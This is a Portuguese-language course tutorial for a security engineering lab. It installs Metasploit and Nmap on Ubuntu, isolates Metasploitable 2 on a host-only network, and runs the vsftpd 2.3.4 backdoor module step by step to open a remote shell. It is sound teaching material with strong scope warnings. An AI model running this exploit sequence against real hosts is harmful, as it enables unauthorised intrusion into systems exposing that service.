# Tutorial de execução: Metasploit no Ubuntu contra Metasploitable 2 em ambiente controlado

**Disciplina:** Engenharia de Segurança  
**Finalidade:** Laboratório educacional — uso exclusivo em ambiente isolado e autorizado

---

## 1. Aviso ético e escopo do laboratório

> **LEIA COM ATENÇÃO ANTES DE PROSSEGUIR.**

Este tutorial foi criado exclusivamente para fins educacionais, no contexto da disciplina de Engenharia de Segurança. Todas as etapas descritas aqui devem ser executadas **somente em laboratório local, controlado e isolado**, utilizando a máquina virtual Metasploitable 2 como único alvo.

**Restrições obrigatórias:**

- Execute este laboratório **somente** contra a VM Metasploitable 2, que é um alvo criado propositalmente para fins de estudo.
- **Nunca** execute varreduras, exploits ou comandos de ataque contra IPs externos, servidores reais, redes públicas, redes corporativas ou qualquer máquina que não seja de sua propriedade e para a qual você não tenha autorização explícita e documentada.
- **Não use Bridge Adapter** na configuração de rede — isso expõe a Metasploitable 2 à sua rede física, colocando em risco outros dispositivos.
- Mantenha a VM vulnerável desligada quando não estiver realizando o laboratório.
- A aplicação destas técnicas fora do escopo autorizado é ilegal e sujeita a penalidades legais severas.

---

## 2. Visão geral do ambiente

```
Ubuntu físico ou VM atacante
    ├── Metasploit Framework  (ferramenta de exploit)
    ├── Nmap                  (varredura de serviços)
    └── VirtualBox
            └── Metasploitable 2  (máquina vítima de laboratório)
```

**Papéis de cada componente:**

| Componente         | Papel no laboratório                                      |
|--------------------|-----------------------------------------------------------|
| Ubuntu             | Máquina atacante — executa Nmap e Metasploit              |
| Metasploitable 2   | Máquina vítima — alvo controlado com serviços vulneráveis |
| Metasploit         | Ferramenta de exploração                                  |
| VirtualBox         | Hospeda e isola a VM vítima                               |
| Rede Host-only     | Isola o tráfego entre atacante e vítima                   |

---

## 3. Pré-requisitos

Antes de começar, verifique se você tem:

- Ubuntu instalado (como sistema nativo ou como outra VM), com acesso administrativo via `sudo`.
- Conexão com a internet para baixar as ferramentas e a VM (apenas durante a instalação; depois tudo ocorre offline).
- Pelo menos **2 GB de RAM livre** para executar a Metasploitable 2. Recomenda-se 4 GB ou mais no total do sistema.
- Espaço em disco: aproximadamente **2–3 GB** para a VM Metasploitable 2 e dependências do Metasploit.
- **Virtualização habilitada** na BIOS/UEFI, caso esteja usando o Ubuntu também como VM (VT-x/AMD-V).

> **Dica:** Se o seu Ubuntu já está rodando dentro do VirtualBox, verifique nas configurações da VM Ubuntu se a opção de "Nested VT-x/AMD-V" está habilitada. Caso contrário, crie a Metasploitable 2 no mesmo nível do Ubuntu, não dentro dele.

---

## 4. Instalação das ferramentas no Ubuntu

### 4.1 Atualizar pacotes do sistema

Antes de instalar qualquer coisa, atualize os repositórios e pacotes:

```bash
sudo apt update
sudo apt upgrade -y
```

Aguarde a conclusão. Pode demorar alguns minutos dependendo da sua conexão.

---

### 4.2 Instalar VirtualBox, unzip, curl e Nmap

Instale as dependências com um único comando:

```bash
sudo apt install virtualbox unzip curl nmap -y
```

O que cada pacote faz:

| Pacote      | Finalidade                                                  |
|-------------|-------------------------------------------------------------|
| virtualbox  | Plataforma de virtualização para executar a VM vítima       |
| unzip       | Extrai o arquivo compactado da Metasploitable 2             |
| curl        | Baixa o instalador do Metasploit Framework                  |
| nmap        | Realiza varredura de portas e identificação de versões      |

> **Nota:** Caso o VirtualBox já esteja instalado, o `apt` simplesmente o ignorará ou atualizará.

---

### 4.3 Instalar Metasploit Framework

O Metasploit Framework pode ser instalado usando o instalador oficial da Rapid7. Execute os seguintes comandos:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

**O que cada comando faz:**

1. `curl ...`: baixa o script de instalação e salva como `msfinstall`.
2. `chmod 755 msfinstall`: torna o script executável.
3. `./msfinstall`: executa a instalação.

> **Atenção:** A instalação pode demorar vários minutos e pode solicitar confirmação em alguns momentos. Responda `y` quando perguntado. Se o script de instalação mudar no futuro, consulte a documentação oficial da Rapid7 em <https://docs.metasploit.com>.

---

### 4.4 Testar o Metasploit

Após a instalação, abra o Metasploit:

```bash
msfconsole
```

Aguarde o carregamento (pode demorar na primeira execução). Dentro do console, verifique o status do banco de dados:

```
db_status
```

Em seguida, saia:

```
exit
```

> **Nota:** Se o banco de dados não estiver conectado, o exploit ainda poderá funcionar normalmente. Para uso básico neste laboratório, a ausência do banco não é impeditiva.

---

## 5. Baixar e preparar a Metasploitable 2

### 5.1 Baixar a VM

A Metasploitable 2 é distribuída gratuitamente pela Rapid7. Para encontrá-la, busque por:

```
Metasploitable 2 Rapid7 SourceForge
```

Acesse o site oficial da Rapid7 ou a página do SourceForge onde o arquivo está hospedado. O download é gratuito.

> **Importante:** Baixe **somente** de fontes confiáveis e oficiais. Não utilize arquivos de origem desconhecida.

O arquivo baixado geralmente é um `.zip` com nome similar a:

```
metasploitable-linux-2.0.0.zip
```

---

### 5.2 Extrair o arquivo

Após o download, extraia o conteúdo. Substitua o nome do arquivo pelo nome real do arquivo baixado:

```bash
unzip metasploitable-linux-2.0.0.zip -d ~/vms/metasploitable2
```

Isso criará a pasta `~/vms/metasploitable2` com o disco virtual da VM, geralmente um arquivo `.vmdk`.

---

### 5.3 Criar a VM no VirtualBox

Abra o VirtualBox e siga os passos abaixo pelo menu gráfico:

1. Clique em **New** (ou **Nova** na versão em português).
2. **Nome:** `Metasploitable 2`
3. **Tipo:** Linux
4. **Versão:** Ubuntu (32-bit) ou Other Linux (32-bit)
5. **Memória RAM:** 512 MB é suficiente; 1024 MB é mais confortável.
6. Na etapa de disco, selecione: **Use an existing virtual hard disk file** (Usar um arquivo de disco rígido virtual existente).
7. Clique no ícone de pasta e localize o arquivo `.vmdk` extraído.
8. Conclua a criação clicando em **Create** (Criar).

> **Não inicie a VM ainda.** Primeiro configure a rede na próxima seção.

---

## 6. Configurar rede isolada no VirtualBox

### 6.1 Criar/verificar rede Host-only

O VirtualBox precisa ter uma rede Host-only configurada. Para verificar:

1. No menu do VirtualBox, vá em **File** → **Tools** → **Network Manager**  
   (ou **Arquivo** → **Ferramentas** → **Gerenciador de Rede**)
2. Clique na aba **Host-only Networks**.
3. Verifique se existe uma rede listada, geralmente chamada `vboxnet0`.
4. Caso não exista, clique em **Create** para criar uma.

---

### 6.2 Configurar a VM para usar Host-only Adapter

Com a Metasploitable 2 **desligada**, configure sua interface de rede:

1. Selecione a VM `Metasploitable 2` no VirtualBox.
2. Clique em **Settings** (Configurações).
3. Vá em **Network** (Rede).
4. Em **Adapter 1**:
   - Marque **Enable Network Adapter** (Habilitar Adaptador de Rede).
   - Em **Attached to** (Conectado a), selecione: **Host-only Adapter**.
   - Em **Name** (Nome), selecione: `vboxnet0` (ou a rede host-only criada).
5. Clique em **OK**.

---

### 6.3 Por que não usar Bridge Adapter

O **Bridge Adapter** conecta a VM diretamente à sua rede física, fazendo com que ela apareça como outro dispositivo na rede local — com um IP acessível por outros computadores da rede.

Como a Metasploitable 2 é **propositalmente vulnerável**, expô-la à rede física (seja em casa, na universidade ou no trabalho) representa um risco real para outros dispositivos. Qualquer pessoa ou software na rede poderia explorá-la inadvertidamente.

Com **Host-only Adapter**, apenas o seu Ubuntu e a Metasploitable 2 se comunicam, em uma rede interna isolada do mundo externo.

> **Regra simples:** Host-only para laboratório. Bridge Adapter nunca para máquinas vulneráveis.

---

## 7. Inicializar a máquina vítima

### 7.1 Login padrão

Inicie a VM Metasploitable 2 no VirtualBox. Após o boot, você verá um prompt de login. Use as credenciais padrão do laboratório:

```
Usuário: msfadmin
Senha:   msfadmin
```

> **Estas são as credenciais padrão da VM de laboratório.** Elas existem propositalmente para facilitar o acesso no ambiente educacional. Nunca use essas credenciais em sistemas reais.

---

### 7.2 Descobrir o IP da vítima

Após fazer login na Metasploitable 2, execute:

```bash
ifconfig
```

Procure a interface `eth0` (ou similar). O IP atribuído pela rede Host-only geralmente será parecido com:

```
192.168.56.101
```

**Anote esse IP.** Ele será utilizado em todos os comandos seguintes. Ao longo deste tutorial, ele é referido como `IP_DA_VITIMA`. Substitua pelo IP real da sua VM sempre que necessário.

---

## 8. Testar conectividade pelo Ubuntu

No terminal do Ubuntu, teste se o Ubuntu consegue alcançar a Metasploitable 2:

```bash
ping IP_DA_VITIMA
```

Exemplo:

```bash
ping 192.168.56.101
```

Se a conexão estiver funcionando, você verá linhas como:

```
64 bytes from 192.168.56.101: icmp_seq=1 ttl=64 time=0.5 ms
```

Para interromper o ping, pressione:

```
Ctrl + C
```

Se o ping não responder, consulte a seção 12 (Problemas comuns e soluções).

---

## 9. Identificar serviços com Nmap

Com a conectividade confirmada, realize uma varredura de serviços e versões na máquina vítima:

```bash
nmap -sV IP_DA_VITIMA
```

Exemplo:

```bash
nmap -sV 192.168.56.101
```

**O que esperar:** o Nmap listará as portas abertas e os serviços em execução. A saída deve incluir algo parecido com:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian
...
```

> **Importante:** Confirme que a porta **21/TCP** está aberta e que o serviço é o **vsftpd 2.3.4**. Essa confirmação é o que justifica tecnicamente o uso do exploit na etapa seguinte. Se a versão mostrada for diferente, o exploit pode não funcionar.

---

## 10. Executar o exploit com Metasploit

### 10.1 Abrir o Metasploit

No Ubuntu, abra o Metasploit Framework:

```bash
msfconsole
```

Aguarde o carregamento completo. Você verá um banner e o prompt `msf6 >`.

---

### 10.2 Procurar o módulo vsftpd

Dentro do Metasploit, busque pelo módulo correspondente:

```
search vsftpd
```

O resultado mostrará uma lista. Você deverá ver algo como:

```
   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

---

### 10.3 Selecionar o módulo correto

Selecione o módulo pelo caminho completo:

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

O prompt mudará para indicar o módulo ativo:

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

---

### 10.4 Configurar RHOSTS e RPORT

Verifique as opções disponíveis:

```
show options
```

Configure o IP da vítima e a porta:

```
set RHOSTS IP_DA_VITIMA
set RPORT 21
```

Exemplo com IP real:

```
set RHOSTS 192.168.56.101
set RPORT 21
```

**O que significam essas opções:**

| Opção   | Significado                          | Valor esperado        |
|---------|--------------------------------------|-----------------------|
| RHOSTS  | IP do alvo (Remote Hosts)            | IP da Metasploitable 2 |
| RPORT   | Porta do serviço no alvo (Remote Port) | 21 (FTP padrão)     |

Confirme que os valores foram aplicados executando `show options` novamente.

---

### 10.5 Executar o exploit

Com tudo configurado, execute o exploit:

```
run
```

O Metasploit tentará acionar o backdoor do `vsftpd 2.3.4`. Se bem-sucedido, você verá uma mensagem indicando que uma sessão foi aberta.

> **O que acontece internamente:** O exploit envia uma sequência específica durante a tentativa de autenticação FTP. Ao recebê-la, o `vsftpd 2.3.4` (versão backdoored) abre uma porta de escuta que permite execução remota de comandos. O Metasploit então se conecta a essa porta.

---

### 10.6 Validar a sessão obtida

Se a sessão for aberta, execute os comandos abaixo para confirmar que você está operando na máquina vítima:

```bash
whoami
id
hostname
uname -a
```

**O que cada comando revela:**

| Comando    | O que mostra                                           |
|------------|--------------------------------------------------------|
| `whoami`   | Nome do usuário atual na sessão remota                 |
| `id`       | UID, GID e grupos do usuário na sessão                 |
| `hostname` | Nome da máquina onde os comandos estão sendo executados |
| `uname -a` | Informações do kernel e sistema operacional da vítima   |

Se os resultados mostrarem dados da Metasploitable 2 (e não da sua máquina Ubuntu), a exploração foi bem-sucedida.

> **Lembre-se:** Execute apenas os comandos acima para fins de validação. Não execute comandos destrutivos, não modifique arquivos, não colete dados e não instale nada na VM vítima.

Ao finalizar, encerre a sessão:

```bash
exit
```

---

## 11. Evidências e prints para o relatório

Registre os seguintes prints durante a execução para documentar o experimento no relatório:

| Nº | Print a registrar                                            |
|----|--------------------------------------------------------------|
| 1  | VirtualBox com a Metasploitable 2 em execução                |
| 2  | Configuração de rede Host-only Adapter na VM                 |
| 3  | `ifconfig` na Metasploitable mostrando o IP                  |
| 4  | `ping IP_DA_VITIMA` funcionando no Ubuntu                    |
| 5  | `nmap -sV IP_DA_VITIMA` mostrando vsftpd 2.3.4 na porta 21  |
| 6  | `msfconsole` aberto e módulo vsftpd selecionado              |
| 7  | `show options` com `RHOSTS` e `RPORT` configurados           |
| 8  | `run` executando o exploit (saída do Metasploit)             |
| 9  | `whoami`, `id`, `hostname` ou `uname -a` na sessão remota   |

> **Dica:** Use a tecla `Print Screen` ou ferramentas como `Flameshot` ou `gnome-screenshot` no Ubuntu para capturar as telas.

---

## 12. Problemas comuns e soluções

### Problema: `ping` não responde

**Sintoma:** `ping 192.168.56.101` não retorna respostas, ou diz "Destination Host Unreachable".

**Possíveis soluções:**
- Confirme se a VM Metasploitable 2 está ligada e com o boot concluído.
- Verifique se a VM está configurada com **Host-only Adapter** (não Bridge, não NAT).
- Execute `ifconfig` na Metasploitable e confirme que o IP está na mesma sub-rede que o `vboxnet0`.
- No Ubuntu, execute `ip addr show` e confirme que ele tem um IP na mesma faixa que a Metasploitable (ex: `192.168.56.1`).
- Verifique se o `vboxnet0` existe no VirtualBox Network Manager.

---

### Problema: `nmap` não mostra a porta 21

**Sintoma:** A varredura não lista a porta 21/TCP ou não mostra `vsftpd 2.3.4`.

**Possíveis soluções:**
- Confirme que o IP usado no `nmap` é o IP da Metasploitable (obtido com `ifconfig` na vítima).
- Reinicie a VM Metasploitable 2 e aguarde o boot completo.
- Tente um scan mais abrangente: `nmap -p 21 -sV IP_DA_VITIMA` para forçar a varredura especificamente na porta 21.

---

### Problema: `msfconsole` não abre ou dá erro

**Sintoma:** Comando não encontrado, ou o console não carrega.

**Possíveis soluções:**
- Feche o terminal e abra um novo.
- Verifique se a instalação foi concluída sem erros.
- Tente chamar diretamente pelo caminho: `/opt/metasploit-framework/bin/msfconsole`
- Em último caso, repita a instalação ou consulte a documentação oficial em <https://docs.metasploit.com>.

---

### Problema: exploit executa mas não abre sessão

**Sintoma:** O Metasploit executa o `run`, mas retorna mensagens de falha ou timeout.

**Possíveis soluções:**
- Confirme que `RHOSTS` está com o IP correto da Metasploitable 2.
- Confirme que `RPORT` está configurado como `21`.
- Verifique se o Nmap confirmou `vsftpd 2.3.4` na porta 21 (não apenas porta 21 aberta).
- Reinicie a VM Metasploitable 2 e tente novamente.
- Execute o exploit mais de uma vez — em alguns casos, o timeout pode ser resolvido tentando novamente.

---

### Problema: Rede Host-only não aparece no VirtualBox

**Sintoma:** Não há opção de `vboxnet0` nas configurações de rede da VM.

**Possíveis soluções:**
- Abra o **File → Tools → Network Manager** no VirtualBox.
- Na aba **Host-only Networks**, clique em **Create** para criar uma nova rede.
- Confirme que a rede foi criada e que tem um IP atribuído (ex: `192.168.56.1`).
- Volte às configurações da VM e selecione a rede recém-criada.

---

## 13. Como encerrar o laboratório com segurança

Após concluir o experimento e registrar as evidências necessárias:

1. **Encerre a sessão remota** (se ainda estiver aberta):
   ```bash
   exit
   ```

2. **Saia do Metasploit**:
   ```
   exit
   ```

3. **Desligue a Metasploitable 2** no VirtualBox:
   - Clique com o botão direito na VM → **Close** → **Power Off**.
   - Ou, na Metasploitable 2, execute: `sudo poweroff`.

4. **Não deixe a VM vulnerável em execução** sem necessidade. A Metasploitable 2 deve ficar ligada somente durante a realização do laboratório.

5. **Mantenha a configuração de rede como Host-only.** Não altere para Bridge Adapter após o experimento.

---

## 14. Resumo dos comandos principais

Esta seção reúne todos os comandos utilizados no laboratório, em ordem de execução.

**No Ubuntu — instalação (uma única vez):**

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install virtualbox unzip curl nmap -y
```

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

---

**Na Metasploitable 2 — descobrir o IP:**

```bash
ifconfig
```

> Anote o IP mostrado na interface `eth0`. Use-o no lugar de `IP_DA_VITIMA` abaixo.

---

**No Ubuntu — verificar conectividade:**

```bash
ping IP_DA_VITIMA
```

---

**No Ubuntu — varredura de serviços:**

```bash
nmap -sV IP_DA_VITIMA
```

---

**No Ubuntu — abrir Metasploit:**

```bash
msfconsole
```

---

**Dentro do Metasploit — executar o exploit:**

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS IP_DA_VITIMA
set RPORT 21
run
```

---

**Na sessão remota — validar o acesso (somente estes comandos):**

```bash
whoami
id
hostname
uname -a
exit
```

---

**No Metasploit — encerrar:**

```
exit
```

---

> **Lembrete final:** Todo este procedimento deve ser executado exclusivamente no ambiente de laboratório descrito. O uso dessas técnicas fora desse contexto, sem autorização expressa, é ilegal. Este tutorial existe para fins educacionais dentro de um ambiente isolado e controlado.
